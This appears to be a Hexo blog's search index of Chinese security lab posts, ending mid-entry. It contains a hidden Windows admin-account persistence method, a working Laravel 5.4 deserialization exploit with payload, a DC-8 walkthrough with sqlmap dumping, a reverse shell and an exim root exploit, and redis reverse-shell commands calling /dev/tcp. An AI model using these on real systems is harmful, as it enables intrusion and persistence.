<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windows创建隐藏用户</title>
      <link href="/2025/04/12/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/"/>
      <url>/2025/04/12/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<h4 id="方法一：用户名后面加上-符号"><a href="#方法一：用户名后面加上-符号" class="headerlink" title="方法一：用户名后面加上$ 符号"></a>方法一：用户名后面加上$ 符号</h4><p>前提条件：在攻击过程中getshell，拿到目标服务器的administrator权限。</p><p>net user hack$ admin &#x2F;add添加hack$这个用户</p><p>net localgroup administrators hack$ &#x2F;add将hack$用户添加进管理员组</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744428078219-b20a29d7-7e72-4b30-a2e2-ea062374cd41.png" alt="img"></p><p>注意：</p><p>此时虽然使用命令行无法看到 wxiaoge$ 隐藏用户，但是采用其它方法仍旧可以发现wxiaoge$ 隐藏用户，为了更好的隐藏新建的账户，还需要进行修改注册表文件操作</p><p>net user 无法看到添加的用户，但是：wmic useraccount get Name 可以看到</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744428220589-6b8c07a5-a0bc-4b30-8b8a-8c808ff2bdb4.png" alt="img"></p><p>同时控制面板也可以看到：</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744428318390-fac5a50f-e5b7-4f40-a3bb-e819de92513a.png" alt="img"></p><p>打开管理工具（控制面板改成小图标）：</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744428616793-541dddef-9c28-4c2e-a035-8bf6ec933752.png" alt="img"></p><p>也可以使用win+x</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744428652044-06b19e8b-427e-4a3c-9001-9f05ca440428.png" alt="img"></p><p>然后找到计算机管理。</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744428710429-d0e2fd74-0ac6-4914-8712-d94036bd000e.png" alt="img"></p><p>找到本地用户和组。<img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744428779166-40fec072-0d9e-4c32-b22a-3f5ecd9fece6.png" alt="img"></p><p>net user看不到的原因：</p><p>该账户是在创建或者加入家庭组的时候自动创建的，用来实现家庭组的功能。</p><p>该账户并不是实质上的用户账户，所以无法通过netuser显示。</p><h4 id="方法二：修改注册表"><a href="#方法二：修改注册表" class="headerlink" title="方法二：修改注册表"></a>方法二：修改注册表</h4><p>前提：需要创建一个带有 $ 符号的用户</p><p>win+r  然后输入：regedit 打开注册表，路径为：HKEY_LOCAL_MARCHINE\SAM\SAM</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744429217006-55d8fc1c-7e27-4865-a748-87a96ae40d96.png" alt="img"></p><p>然后右键点击权限：修改成如下选项。</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744430357333-707b5713-dc22-4634-ac9d-d6dfdaa832d2.png" alt="img"></p><p>然后确定，重新打开注册表就能看到SAM的内容。</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744430500327-27d02c2d-f05c-4cee-bdb0-3d715aff1cba.png" alt="img"></p><p>此时我们要导出</p><ol><li>user下的administrator的隐藏文件，即 1F4</li><li>user&#x2F;name 下test$账户的文件</li><li>user下的 test$ 账户的隐藏文件，在name下看到对应的是 3ED</li></ol><p>右键导出即可。</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744435535605-5d13373b-6f62-4193-bb3c-79100c660eac.png" alt="img"></p><p>最后导出这三个文件：</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744435639186-02442af6-f578-4b05-9b5b-c893d6c37cc1.png" alt="img"></p><p>导出之后，用记事本打开这两个文件，把administrator注册表文件中的F值赋值到test$ 账户的隐藏文件中去。</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744435596123-3d1d3ed8-0bc3-4e19-b5e9-30260c7c525c.png" alt="img"></p><p>替换之后，然后保存，删除  hack$ 用户： net user test$ &#x2F;del</p><p>然后双击运行两个test的reg文件：<img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744435739806-43b51b97-f15d-428a-ba46-a5ebf4d5d57e.png" alt="img"></p><p>最后的结果：控制面板看不到test$ ，net user 也是。</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744435785388-84f8dae8-b42b-475d-8eb9-12b159e15cde.png" alt="img"></p><p>只有注册表跟 net user test$ 可以看到创建的 test$用户</p><p><img src="/../image/Windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/1744435433485-f4447670-c719-4cc0-b89e-6500ee5e7a84.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel漏洞复现5.4</title>
      <link href="/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/"/>
      <url>/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/</url>
      
        <content type="html"><![CDATA[<p>首先在：\routes\web.php 把配置文件换成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&quot;/&quot;,&quot;\App\Http\Controllers\POPController@test&quot;);</span><br></pre></td></tr></table></figure><p>然后\app\Http\Controllers\POPController.php插入：（没有这个文件就自行创建）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">class POPController extends Controller&#123;</span><br><span class="line">    public function test()&#123;</span><br><span class="line">        if(isset($_GET[&#x27;test&#x27;]))&#123;</span><br><span class="line">            unserialize($_GET[&#x27;test&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;Welcome!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是代码审计：首先反序列化，就找到与之相关的魔术方法： __destruct() 和 __wakeup()</p><p>这里找的是 __destruct()，最后锁定的就是：PendingBroadcast.php</p><p><img src="/../image/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/1744298256935-3f0bffea-a7d1-4c6d-9ac2-feaf1b1c83f9.png" alt="img"></p><p>跟进去，发现最后调用了一个 dispatch 函数，这里可以调用一个不存在的函数，触发__call() 魔术方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后全局搜索 __call()魔术方法，这有个技巧就是，最好搜索 __call(       因为我搜索__call找不到要寻找的类。</p><p><img src="/../image/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/1744298549791-743c25f8-71f1-491f-92c0-e51ff5705e4c.png" alt="img"></p><p>最后锁定Faker\Generator.php</p><p>跟进：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $attributes)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后再跟进 format</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function format($formatter, $arguments = array())</span><br><span class="line">&#123;</span><br><span class="line">    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后跟进getFormatter：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function getFormatter($formatter)</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($this-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        return $this-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($this-&gt;providers as $provider) &#123;</span><br><span class="line">        if (method_exists($provider, $formatter)) &#123;</span><br><span class="line">            $this-&gt;formatters[$formatter] = array($provider, $formatter);</span><br><span class="line"></span><br><span class="line">            return $this-&gt;formatters[$formatter];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    throw new \InvalidArgumentException(sprintf(&#x27;Unknown formatter &quot;%s&quot;&#x27;, $formatter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现$this-&gt;formatters[$formatter] 我们可以控制。</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    class PendingBroadcast&#123;</span><br><span class="line">        public function __construct($events, $event)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;event = $event;</span><br><span class="line">            $this-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters = array();</span><br><span class="line">        public function __construct($fun)</span><br><span class="line">        &#123;</span><br><span class="line">            $this -&gt; formatters = [&quot;dispatch&quot; =&gt; $fun];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $a = new Faker\Generator(&quot;system&quot;);</span><br><span class="line">    $b = new Illuminate\Broadcasting\PendingBroadcast($a,&quot;dir&quot;);</span><br><span class="line">    echo urlencode(serialize($b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:888/?test=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A5%3A%22event%22%3Bs%3A6%3A%22whoami%22%3Bs%3A6%3A%22events%22%3BO%3A15%3A%22Faker%5CGenerator%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00formatters%22%3Ba%3A1%3A%7Bs%3A8%3A%22dispatch%22%3Bs%3A6%3A%22system%22%3B%7D%7D%7DPHP</span><br></pre></td></tr></table></figure><p><img src="/../image/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/1744298914507-e527ddc8-53b7-4bb5-a358-4562dd82fef0.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel本地环境搭建</title>
      <link href="/2025/04/10/laravel%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2025/04/10/laravel%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>z最近忙着复现漏洞，就到了laravel了。所以就搭建本地环境来进行测试，这个过程也遇到了很多问题，就记录了搭建过程。</p><h3 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h3><p>首先去github下载源码：<a href="https://github.com/laravel-shift/laravel-5.4">https://github.com/laravel-shift/laravel-5.4</a></p><p>然后放在phpstudy的根目录下（WWW）</p><p><img src="/../image/laravel%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1744292838324-e4c83e23-ae13-48bb-bb62-1621ce26a800.png" alt="img"></p><p>然后在phpstudy中设置public 为根目录。<img src="/../image/laravel%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1744294081198-934cdd3d-e07a-4c96-a42c-6e34d8839e2e.png" alt="img"></p><h3 id="配置php版本（最好为php7）"><a href="#配置php版本（最好为php7）" class="headerlink" title="配置php版本（最好为php7）"></a>配置php版本（最好为php7）</h3><p>设置好环境变量。</p><p><img src="/../image/laravel%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1744293844519-3f41be92-9787-4851-9ffa-fee0d4213e5b.png" alt="img"></p><h3 id="下载依赖"><a href="#下载依赖" class="headerlink" title="下载依赖"></a>下载依赖</h3><p>composer install</p><p><img src="/../image/laravel%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1744293923448-022f1ebc-b36d-4645-924f-7b2f7fe33eb6.png" alt="img"></p><p>完成之后会出现vendor目录。同时把 .env.example 改名为： .env</p><p><img src="/../image/laravel%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1744293976795-d5b601a6-6bc3-41ab-85c6-93e187f60f65.png" alt="img"></p><p>输入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan key:generate</span><br></pre></td></tr></table></figure><p>生成key，然后访问 localhost:888 就可以看到 laravel 了</p><p><img src="/../image/laravel%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1744294165523-d431ec91-3413-441d-be1e-1bad00865a1a.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apache日志分析</title>
      <link href="/2025/04/10/apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2025/04/10/apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>1、提交当天访问次数最多的IP，即黑客IP</p><p>首先定位到 apache 的日志文件：&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log.1</p><p><img src="/../image/apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1744288404887-04bc53ea-69db-49b4-ab05-bc52c8ec3912.png" alt="img"></p><p>很容易发现flag：flag{192.168.200.2}</p><p>或者也可以使用linux命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cut: 这是一个命令，用于从每一行文本中剪切出指定部分。</span><br><span class="line">-d-: 指定分隔符为 -</span><br><span class="line">-f 1: 指定要剪切的字段为第一个字段。</span><br><span class="line">access.log.1: 这是要处理的日志文件的文件名或路径。</span><br><span class="line">uniq -c: 这个命令会从输入中删除重复的行，并且计算每行重复出现的次数。</span><br><span class="line">-c: 会在输出中显示每行重复出现的次数。</span><br><span class="line">sort : 这个命令会对输入进行排序。</span><br><span class="line">-r: 表示反向排序，即降序排列。</span><br><span class="line">-n: 表示按照数值大小排序。</span><br><span class="line">head -20: 最后，这个命令会从排序后的结果中提取前 20 行。</span><br><span class="line">| : 管道命令符，表示前一项的输出结果作为后一项的输入</span><br></pre></td></tr></table></figure><p>最后得到命令：cut -d- -f 1 access.log.1 | uniq -c | sort -rn | head -1</p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>2、黑客使用的浏览器指纹是什么，提交指纹的md5：</p><p><img src="/../image/apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1744289038542-1aded387-edf3-4fe1-b847-55c20003a9f3.png" alt="img"></p><p>找到浏览器指纹，进行md5加密：<br>flag{2d6330f380f44ac20f3a02eed0958f66}</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>3、查看包含index.php页面被访问的次数，提交次数：</p><p>执行命令：cat access.log.1 | grep “&#x2F;index.php” | wc -l</p><p><img src="/../image/apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1744289420986-1b6567fd-d8bf-433d-8bde-30ad78ac4fc0.png" alt="img"></p><p>但是要去掉只有 &#x2F;index.php 的页面，因为是包含。</p><p>flag{25}</p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>4、查看黑客IP访问了多少次，提交次数：</p><p>命令：cat access.log.1 | grep ‘192.168.200.2 - - ‘  | wc -l</p><p><img src="/../image/apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1744289604627-ef4277b1-d953-48ac-a1cd-b50b8fc1b286.png" alt="img"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</p><p>cat access.log.1 | grep “03&#x2F;Aug&#x2F;2023:08:” | awk ‘{print $1}’ | sort | uniq -c | wc -l</p><p><img src="/../image/apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1744289904206-9eddb5fa-f5db-44ca-8cce-6a591fa5f03c.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 玄机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dc-8</title>
      <link href="/2025/04/10/dc-8/"/>
      <url>/2025/04/10/dc-8/</url>
      
        <content type="html"><![CDATA[<p>还是一样，基本的信息搜集</p><p><img src="/../image/dc-8/1736819982929-823bc4f1-234c-4d02-b3dd-6a0f1822bd6b-1744245050049-1.png" alt="img"></p><p><img src="/../image/dc-8/1736820016554-42e1f37a-b08d-41d3-b9aa-45b967f06fcc-1744245050049-3.png" alt="img"></p><p>得到ip地址为：192.168.166.22</p><p>然后用nmap进行端口扫描</p><p><img src="/../image/dc-8/1736820124841-ccd48e03-c296-4cd8-a8f0-1f0ffd479e9d-1744245050049-5.png" alt="img"></p><p>最后就是发现了sql注入</p><p><img src="/../image/dc-8/1736822547332-39ee4cc9-2f23-48b0-a1c5-bffe60a90a88-1744245050049-9.png" alt="img"></p><p>然后使用sql将数据表给打印出来（这里是指定对应的列进行打印，这里只打印了name,pass,uid这三列）</p><p>sqlmap -u <a href="http://192.168.166.22/?nid=1">http://192.168.166.22/?nid=1</a> -D ‘d7db’ -T ‘users’ -C’name,pass,uid’ –dump</p><p><img src="/../image/dc-8/1736825376227-25f4763c-6b9e-4669-a806-a2582868df4c-1744245050049-7.png" alt="img"></p><p>最后得到的密码毫无疑问是经过了加密的</p><p>因为这里的cms是drupal，所以它的hash密文都是经过特殊加密的，可以用john进行破解</p><p><img src="/../image/dc-8/1736825483491-608cb302-7d93-4ab0-8692-5d561819da0a-1744245050049-11.png" alt="img"></p><p>先将上面的到的两个密文存放到一个txt文件中</p><p><img src="/../image/dc-8/1736826662446-99a18404-b8cc-4c5a-9aa9-227da0e66bc9-1744245050049-13.png" alt="img"></p><p>因为前面用dirsearch扫描到了一个user&#x2F;login，然后使用刚刚得到的密码登录进去</p><p>在这里执行反弹shell的命令，最后返回页面提交一个邮件，就可以反弹shell了</p><p><img src="/../image/dc-8/1736826736444-3e2a0771-e3f2-4aa1-863c-bd73af80de6b-1744245050049-15.png" alt="img"></p><p><img src="/../image/dc-8/1736826793933-7c32c786-cbe9-4ff6-9461-d6c708b272c0-1744245050049-17.png" alt="img"></p><p>获取交互式页面</p><p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p><p>接下来就是提权：</p><p>查找具有二进制的可执行文件：find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p><img src="/../image/dc-8/1736826967296-bdffaf8a-4086-48d4-a7cf-77d0c3bc8214-1744245050049-19.png" alt="img"></p><p>尝试exim4提权，先查看exim4的版本</p><p><img src="/../image/dc-8/1736827138775-1fcfa183-c0a3-4eb2-b75b-dac563f62ca4-1744245050049-23.png" alt="img"></p><p>然后查找本地漏洞库，使用：Exim 4.87 - 4.91 - Local Privilege Escalation                   | linux&#x2F;local&#x2F;46996.sh</p><p><img src="/../image/dc-8/1736828061144-bbd2adab-100f-4777-8cec-1ec1aa383755-1744245050049-21.png" alt="img"></p><p>然后开启kali的apache服务，将这个脚本文件拷贝到受害机器上面。</p><p>systemctl start apache2.service  </p><p>将脚本文件放在网页目录下</p><p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;46996.sh &#x2F;var&#x2F;www&#x2F;html</p><p>最后因为在受害者机器上的&#x2F;var&#x2F;www&#x2F;html目录上面没有可写入的权限</p><p><img src="/../image/dc-8/1736828296664-097d3a80-62f3-41ba-b5aa-bb7131ce7594-1744245050050-25.png" alt="img"></p><p>所以要找一个可以写入文件的目录，通常根目录下的tmp目录 对于所有用户都有可执行可写可读权限，</p><p>也可以使用命令 ls -l 来查看哪些文件有哪些权限</p><p><img src="/../image/dc-8/1736828472541-741ed6b1-0181-4d4e-b291-cee74b1aa08f-1744245050050-29.png" alt="img"></p><p>最后进入tmp目录下，将kali中的脚本文件拷贝下来。并且赋予可执行权限</p><p><img src="/../image/dc-8/1736828549710-eadf8039-e84a-4e43-899f-420062fdc5ce-1744245050050-27.png" alt="img"></p><p>最后与dc-4不同的是，这个需要使用命令：</p><p>.&#x2F;46996.sh -m netcat</p><p><img src="/../image/dc-8/1736828053130-a244b3ba-4229-4d2b-8426-e471bdc14aac-1744245050050-31.png" alt="img"></p><p>可以看到已经拿到root权限了</p><p>这里也可以使用命令：.&#x2F;46996.sh -h 来查看这个命令的用法</p><p><img src="/../image/dc-8/1736828729497-63a45cbe-f850-41bd-b3e7-ea29cf9109e6-1744245050050-33.png" alt="img"></p><p>最后进入&#x2F;root，拿到最后的flag</p><p><img src="/../image/dc-8/1736828943345-fa9bdcd2-e871-4a6d-8a8b-c7c5906a0bae-1744245050050-35.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2025/04/09/test/"/>
      <url>/2025/04/09/test/</url>
      
        <content type="html"><![CDATA[<p>f</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;谢谢包师傅&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line">test!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志分析-redis应急响应</title>
      <link href="/2025/04/08/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2025/04/08/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<p>QAQ~</p><span id="more"></span><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>查看redis日志文件。注意到一个ip多次连接，很可疑。</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744103548382-f7000f8a-b2ac-49e8-954a-6efd0bc65564.png" alt="img"><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744103555618-0e3c59ec-c390-4a88-bee9-84022db33eef.png" alt="img"></p><p>得到flag{192.168.100.13}</p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p> 通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;  </p><p>这里注意到加载了一个system模块。是从exp.so文件来的，很可能就是webshell</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744103806981-59a3c213-7cab-432e-b834-8f37ec7993e3.png" alt="img"></p><p>而且redis也有利用主从复制getshell的攻击手法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp/ //设置文件路径为/tmp/</span><br><span class="line">config set dbfilename exp.so //设置数据库文件名为：exp.so</span><br><span class="line">slaveof vpsip port //设置主redis地址为 vpsip，端口为 port</span><br><span class="line">module load /tmp/exp.so</span><br><span class="line">system.exec &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><p>首先连接靶机redis：redis-cli</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744104158603-c7f51a08-cbd8-4d33-8ffa-e7587f1b0d5e.png" alt="img"></p><p>然后下载这个exp.so文件，放到云沙箱中进行分析：</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744104831855-a83472cb-f19a-41c7-92be-f79839eac002.png" alt="img"></p><p>放进一个编辑器：找到flag：flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744104958466-dcf997ac-082a-4780-86d4-318e895cfa73.png" alt="img"></p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p> 通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;  </p><p>同样redis的攻击手法里有利用crontab写入定时任务来反弹shell的手法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.100.13 #连接</span><br><span class="line"> </span><br><span class="line">redis flushall #清除所有键值</span><br><span class="line"> </span><br><span class="line">config set dir /var/spool/cron/crontabs/ #设置保存路径</span><br><span class="line"> </span><br><span class="line">config set dbfilename shell #保存名称</span><br><span class="line"> </span><br><span class="line">set xz “\n * bash -i &gt;&amp; /dev/tcp/192.168.100.13/7777 0&gt;&amp;1\n” #将反弹shell写入xz键值</span><br><span class="line"> </span><br><span class="line">save 